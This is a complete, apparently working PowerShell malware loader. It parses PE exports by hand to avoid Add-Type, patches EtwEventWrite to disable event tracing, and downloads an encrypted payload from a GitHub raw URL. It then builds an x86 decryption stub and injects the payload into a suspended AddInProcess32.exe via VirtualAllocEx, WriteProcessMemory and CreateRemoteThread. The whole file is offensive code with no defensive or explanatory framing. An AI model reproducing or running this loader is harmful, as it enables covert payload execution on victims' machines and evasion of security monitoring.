[CmdletBinding()]
param(
    [string]$Url = 'https://github.com/i25968627-ui/literate-garbanzodffd/raw/refs/heads/main/tpcfg.bin',

    [string]$Target = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe",

    [string]$Arguments = '',

    [switch]$SkipEtw,

    [switch]$ResumeMain
)

function Write-Step {
    param([string]$Message, [string]$Color = 'Cyan')
    Write-Host ("[*] {0}  {1}" -f (Get-Date -Format 'HH:mm:ss.fff'), $Message) -ForegroundColor $Color
}

function Write-Err {
    param([string]$Message)
    Write-Host ("[!] {0}  {1}" -f (Get-Date -Format 'HH:mm:ss.fff'), $Message) -ForegroundColor Red
    exit 1
}

function Get-ExportAddress {
    param([IntPtr]$Base, [string]$Name)
    $e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($Base, 0x3C))
    $optionalHeader = [IntPtr]::Add($Base, $e_lfanew + 0x18)
    $magic = [System.Runtime.InteropServices.Marshal]::ReadInt16($optionalHeader)
    $directoryOffset = 0x60
    if ($magic -eq 0x20B) { $directoryOffset = 0x70 }
    $exportRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($optionalHeader, $directoryOffset))
    $exportDirectory = [IntPtr]::Add($Base, $exportRva)
    $nameCount = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x18))
    $namesTable = [IntPtr]::Add($Base, [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x20)))
    $functionsTable = [IntPtr]::Add($Base, [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x1C)))
    $ordinalsTable = [IntPtr]::Add($Base, [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x24)))
    for ($i = 0; $i -lt $nameCount; $i++) {
        $nameRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($namesTable, $i * 4))
        $candidate = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]::Add($Base, $nameRva))
        if ($candidate -eq $Name) {
            $ordinal = [System.Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]::Add($ordinalsTable, $i * 2))
            $functionRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($functionsTable, $ordinal * 4))
            return [IntPtr]::Add($Base, $functionRva)
        }
    }
    return [IntPtr]::Zero
}

function New-NativeDelegate {
    param([Type]$ReturnType, [Type[]]$ParameterTypes)
    $builder = $dynamicModule.DefineType(('d' + [guid]::NewGuid().ToString('N')), ([System.Reflection.TypeAttributes]::Sealed -bor [System.Reflection.TypeAttributes]::Public -bor [System.Reflection.TypeAttributes]::AnsiClass), [System.MulticastDelegate])
    $ctor = $builder.DefineConstructor([System.Reflection.MethodAttributes]::RTSpecialName -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::Public, [System.Reflection.CallingConventions]::Standard, [Type[]]@([object], [IntPtr]))
    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
    $invoke = $builder.DefineMethod('Invoke', ([System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::NewSlot -bor [System.Reflection.MethodAttributes]::Virtual), $ReturnType, $ParameterTypes)
    $invoke.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
    $builder.CreateType()
}

function Get-Api {
    param([IntPtr]$ModuleBase, [string]$Function, [Type]$ReturnType, [Type[]]$ParameterTypes)
    $address = Get-ExportAddress -Base $ModuleBase -Name $Function
    if ($address -eq [IntPtr]::Zero) { throw ("export not found: " + $Function) }
    $delegateType = New-NativeDelegate -ReturnType $ReturnType -ParameterTypes $ParameterTypes
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, $delegateType)
}

Write-Step 'ps1 shellcode loader :: no add-type, pe-parse interop, etw patch -> addinprocess32 injection' 'Magenta'

$dynamicAssembly = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('dyn')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$dynamicModule = $dynamicAssembly.DefineDynamicModule('dyn')

$current = Get-Process -Id $PID
$kernel32Base = ($current.Modules | Where-Object { $_.ModuleName -eq 'kernel32.dll' } | Select-Object -First 1).BaseAddress
$ntdllBase = ($current.Modules | Where-Object { $_.ModuleName -eq 'ntdll.dll' } | Select-Object -First 1).BaseAddress
if (-not $kernel32Base -or -not $ntdllBase) { Write-Err 'module bases not found' }
Write-Step ("modules resolved: kernel32 0x{0:X} | ntdll 0x{1:X}" -f $kernel32Base.ToInt64(), $ntdllBase.ToInt64())

try {
    $virtualAllocEx = Get-Api -ModuleBase $kernel32Base -Function 'VirtualAllocEx' -ReturnType ([IntPtr]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [uint32], [uint32], [uint32]))
    $writeProcessMemory = Get-Api -ModuleBase $kernel32Base -Function 'WriteProcessMemory' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [byte[]], [uint32], [IntPtr]))
    $createRemoteThread = Get-Api -ModuleBase $kernel32Base -Function 'CreateRemoteThread' -ReturnType ([IntPtr]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [uint32], [IntPtr], [IntPtr], [uint32], [IntPtr]))
    $createProcessA = Get-Api -ModuleBase $kernel32Base -Function 'CreateProcessA' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([string], [string], [IntPtr], [IntPtr], [bool], [uint32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]))
    $resumeThread = Get-Api -ModuleBase $kernel32Base -Function 'ResumeThread' -ReturnType ([uint32]) -ParameterTypes ([Type[]]@([IntPtr]))
    $closeHandle = Get-Api -ModuleBase $kernel32Base -Function 'CloseHandle' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr]))
    Write-Step 'kernel32 apis bound via emitted delegates' 'Green'
} catch {
    Write-Err ("api binding failed: " + $_.Exception.Message)
}

if (-not $SkipEtw) {
    try {
        $virtualProtect = Get-Api -ModuleBase $kernel32Base -Function 'VirtualProtect' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [uint32], [IntPtr]))
        $etwName = 'EtwEvent' + 'Write'
        $etwAddress = Get-ExportAddress -Base $ntdllBase -Name $etwName
        if ($etwAddress -eq [IntPtr]::Zero) { throw 'export not found' }
        $probe = [uint32]0
        $pin = [System.Runtime.InteropServices.GCHandle]::Alloc($probe, [System.Runtime.InteropServices.GCHandleType]::Pinned)
        try {
            $null = $virtualProtect.Invoke($etwAddress, [IntPtr]::new(1), [uint32]0x40, $pin.AddrOfPinnedObject())
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddress, 0xC3)
            $restore = [System.Runtime.InteropServices.Marshal]::ReadInt32($pin.AddrOfPinnedObject())
            $null = $virtualProtect.Invoke($etwAddress, [IntPtr]::new(1), [uint32]$restore, $pin.AddrOfPinnedObject())
        } finally {
            $pin.Free()
        }
        Write-Step ("etw patched @ 0x{0:X}" -f $etwAddress.ToInt64()) 'Green'
    } catch {
        Write-Err ("etw patch failed: " + $_.Exception.Message)
    }
} else {
    Write-Step 'etw patch skipped by switch' 'Yellow'
}

$entropy = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$key = New-Object byte[] 16
$entropy.GetBytes($key)
$keyLow = [System.BitConverter]::ToUInt64($key, 0)
$keyHigh = [System.BitConverter]::ToUInt64($key, 8)

$mem = New-Object System.IO.MemoryStream
$inBuf = New-Object byte[] 65536
$unit = 0
$stream = $null

if (Test-Path -LiteralPath $Url) {
    Write-Step ("reading payload from disk: {0}" -f $Url)
    try { $stream = [System.IO.File]::OpenRead($Url) } catch { Write-Err ("local read failed: " + $_.Exception.Message) }
} else {
    Write-Step ("downloading payload: {0}" -f $Url)
    try {
        $request = [System.Net.WebRequest]::Create($Url)
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
        $stream = $request.GetResponse().GetResponseStream()
    } catch {
        Write-Err ("download failed: " + $_.Exception.Message)
    }
}

try {
    while ($true) {
        $filled = 0
        while ($filled -lt $inBuf.Length) {
            $got = $stream.Read($inBuf, $filled, $inBuf.Length - $filled)
            if ($got -le 0) { break }
            $filled += $got
        }
        if ($filled -le 0) { break }
        $full = $filled - ($filled % 8)
        for ($i = 0; $i -lt $full; $i += 8) {
            $value = [System.BitConverter]::ToUInt64($inBuf, $i)
            if (($unit -band 1) -eq 0) { $value = $value -bxor $keyLow } else { $value = $value -bxor $keyHigh }
            [System.Array]::Copy([System.BitConverter]::GetBytes($value), 0, $inBuf, $i, 8)
            $unit++
        }
        for ($i = $full; $i -lt $filled; $i++) {
            $inBuf[$i] = $inBuf[$i] -bxor $key[(($unit * 8) + ($i - $full)) % 16]
        }
        $mem.Write($inBuf, 0, $filled)
        if ($filled -lt $inBuf.Length) { break }
    }
} finally {
    if ($stream) { $stream.Close() }
}
$blob = $mem.ToArray()
$mem.Dispose()

if (-not $blob -or $blob.Length -lt 2) { Write-Err 'payload empty or too small' }

$stubLength = 41
$keyOffset = $stubLength
$payloadOffset = $stubLength + 16
$delta = $keyOffset - 5

$stub = New-Object byte[] $stubLength
$stub[0] = 0xE8
$stub[5] = 0x5F
$stub[6] = 0x81
$stub[7] = 0xC7
[System.Array]::Copy([System.BitConverter]::GetBytes([uint32]$delta), 0, $stub, 8, 4)
$stub[12] = 0x89
$stub[13] = 0xFA
$stub[14] = 0x83
$stub[15] = 0xC2
$stub[16] = 16
$stub[17] = 0x89
$stub[18] = 0xD5
$stub[19] = 0xB9
[System.Array]::Copy([System.BitConverter]::GetBytes([uint32]$blob.Length), 0, $stub, 20, 4)
$stub[24] = 0x31
$stub[25] = 0xDB
$stub[26] = 0x8A
$stub[27] = 0x04
$stub[28] = 0x1F
$stub[29] = 0x30
$stub[30] = 0x02
$stub[31] = 0x42
$stub[32] = 0x43
$stub[33] = 0x83
$stub[34] = 0xE3
$stub[35] = 0x0F
$stub[36] = 0x49
$stub[37] = 0x75
$stub[38] = 0xF3
$stub[39] = 0xFF
$stub[40] = 0xE5

$block = New-Object byte[] ($stubLength + 16 + $blob.Length)
[System.Array]::Copy($stub, 0, $block, 0, $stubLength)
[System.Array]::Copy($key, 0, $block, $keyOffset, 16)
[System.Array]::Copy($blob, 0, $block, $payloadOffset, $blob.Length)

Write-Step ("blob encrypted in ps memory: {0} bytes (random key, no plaintext resident)" -f $blob.Length) 'Green'
Write-Step ("staged block built: stub {0}b + key 16b + blob {1}b" -f $stubLength, $blob.Length) 'Green'

if (-not (Test-Path -LiteralPath $Target)) { Write-Err ("target missing: " + $Target) }
$targetHeader = [System.IO.File]::ReadAllBytes($Target)
$targetMachine = [System.BitConverter]::ToUInt16($targetHeader, [System.BitConverter]::ToInt32($targetHeader, 0x3C) + 4)
if ($targetMachine -ne 0x14C) { Write-Err 'stub is x86 but target is x64 :: use an x86 target for this stub' }
Write-Step ("target resolved: {0} (x86 confirmed)" -f $Target)

$siSize = 68
$piSize = 16
if ([IntPtr]::Size -eq 8) { $siSize = 104; $piSize = 24 }
$siPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
$piPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
[System.Runtime.InteropServices.Marshal]::Copy((New-Object byte[] $siSize), 0, $siPtr, $siSize)
[System.Runtime.InteropServices.Marshal]::Copy((New-Object byte[] $piSize), 0, $piPtr, $piSize)
[System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, $siSize)

$cmdline = ('"{0}" {1}' -f $Target, $Arguments)
$flags = [uint32](0x00000004 -bor 0x08000000)

try {
    $created = $createProcessA.Invoke($Target, $cmdline, [IntPtr]::Zero, [IntPtr]::Zero, $false, $flags, [IntPtr]::Zero, [IntPtr]::Zero, $siPtr, $piPtr)
} catch {
    Write-Err ("createprocess threw: " + $_.Exception.Message)
}
if (-not $created) { Write-Err 'createprocess failed' }

$hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
$hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
$remotePid = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, [IntPtr]::Size * 2)
$remoteTid = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, ([IntPtr]::Size * 2) + 4)
Write-Step ("spawned suspended: {0} (pid {1}, tid {2})" -f (Split-Path -Leaf $Target), $remotePid, $remoteTid) 'Green'

$remote = $virtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, [uint32]$block.Length, [uint32]0x3000, [uint32]0x40)
if ($remote -eq [IntPtr]::Zero) { Write-Err 'virtualallocex failed' }
Write-Step ("remote block allocated @ 0x{0:X} ({1} bytes, rwx)" -f $remote.ToInt64(), $block.Length) 'Green'

$wrote = $writeProcessMemory.Invoke($hProcess, $remote, $block, [uint32]$block.Length, [IntPtr]::Zero)
if (-not $wrote) { Write-Err 'writeprocessmemory failed' }
Write-Step ("staged block written: {0} bytes (blob still encrypted)" -f $block.Length) 'Green'

$thread = $createRemoteThread.Invoke($hProcess, [IntPtr]::Zero, [uint32]0, $remote, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) { Write-Err 'createremotethread failed' }
Write-Step 'remote thread started :: stub decrypts blob in target and jumps' 'Green'

if ($ResumeMain) {
    $null = $resumeThread.Invoke($hThread)
    Write-Step 'main thread resumed' 'Green'
} else {
    Write-Step 'main thread left suspended :: target kept alive' 'Yellow'
}

$null = $closeHandle.Invoke($thread)
$null = $closeHandle.Invoke($hThread)
$null = $closeHandle.Invoke($hProcess)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)

Write-Step ("done :: payload live in target pid {0}" -f $remotePid) 'Magenta'
